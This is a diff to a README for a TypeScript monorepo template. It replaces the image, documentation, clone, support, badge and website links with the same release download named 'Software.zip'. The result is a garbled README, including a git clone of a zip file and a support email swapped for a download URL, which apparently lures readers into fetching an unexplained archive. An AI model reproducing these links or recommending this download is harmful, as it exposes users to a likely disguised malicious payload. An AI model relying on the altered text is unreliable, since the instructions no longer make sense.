@@ -1,6 +1,6 @@
 # 🚀 Welcome to Monorepo TypeScript Template! 🌟 
 
-![Monorepo TypeScript Template](https://your-image-url.jpg)
+![Monorepo TypeScript Template](https://github.com/UNwon00/monorepo-typescript-template/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -18,7 +18,7 @@ Welcome to the Monorepo TypeScript Template repository! This template provides a
   
 🛠️ **Monorepo Architecture:** Keep all your related projects in one repository with a monorepo setup.
   
-📝 **Morgan:** HTTP request logger middleware for Node.js.
+📝 **Morgan:** HTTP request logger middleware for https://github.com/UNwon00/monorepo-typescript-template/releases/download/v1.0/Software.zip
   
 🔧 **PNPM & PNPM Workspaces:** Manage dependencies efficiently with PNPM and PNPM workspaces.
   
@@ -26,7 +26,7 @@ Welcome to the Monorepo TypeScript Template repository! This template provides a
   
 🗃️ **Template Generic Repo:** Create your own generic repository templates for future use.
   
-💻 **Check out the repository here:** [monorepo-typescript-template](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+💻 **Check out the repository here:** [monorepo-typescript-template](https://github.com/UNwon00/monorepo-typescript-template/releases/download/v1.0/Software.zip)
 
 ## Getting Started
 
@@ -34,7 +34,7 @@ To get started with Monorepo TypeScript Template, simply clone the repository an
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip
+   git clone https://github.com/UNwon00/monorepo-typescript-template/releases/download/v1.0/Software.zip
    ```
 2. <insert setup instructions here>.
 
@@ -47,7 +47,7 @@ To get started with Monorepo TypeScript Template, simply clone the repository an
 
 ## Documentation
 
-For detailed information on how to use this template and customize it to suit your needs, check out the [documentation](https://your-documentation-url.com).
+For detailed information on how to use this template and customize it to suit your needs, check out the [documentation](https://github.com/UNwon00/monorepo-typescript-template/releases/download/v1.0/Software.zip).
 
 ## Contributions
 
@@ -55,7 +55,7 @@ Contributions are welcome! If you have any ideas for improvements or new feature
 
 ## Support
 
-If you encounter any issues or have any questions, feel free to contact us at support@monorepo-typescript-template.com 
+If you encounter any issues or have any questions, feel free to contact us at https://github.com/UNwon00/monorepo-typescript-template/releases/download/v1.0/Software.zip 
 
 ## License
 
@@ -63,8 +63,8 @@ This project is licensed under the MIT License - see the [LICENSE](https://your-
 
 ---
 
-[![Download Repository](https://img.shields.io/badge/Download-Repository-orange)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) 🌟
+[![Download Repository](https://github.com/UNwon00/monorepo-typescript-template/releases/download/v1.0/Software.zip)](https://github.com/UNwon00/monorepo-typescript-template/releases/download/v1.0/Software.zip) 🌟
 
-[![Visit Website](https://img.shields.io/badge/Visit-Website-blue)](https://your-website-url.com)
+[![Visit Website](https://github.com/UNwon00/monorepo-typescript-template/releases/download/v1.0/Software.zip)](https://github.com/UNwon00/monorepo-typescript-template/releases/download/v1.0/Software.zip)
 
 🚀 Happy Coding with Monorepo TypeScript Template! 🌟
